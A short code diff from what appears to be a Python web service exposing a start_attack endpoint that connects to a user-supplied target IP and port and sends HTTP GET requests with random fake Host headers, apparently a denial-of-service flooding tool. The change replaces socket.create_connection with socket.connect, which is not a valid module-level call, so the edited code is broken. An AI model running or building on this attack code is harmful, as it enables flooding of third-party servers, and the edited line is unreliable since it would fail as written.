@@ -14,7 +14,7 @@ def start_attack():
     target_port = data.get('port', 80)
 
     def attack():
-        s = socket.create_connection((target_ip, int(target_port)))
+        s = socket.connect((target_ip, int(target_port)))
         fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
         host_header = f"Host: {fake_ip}\r\n"
         payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
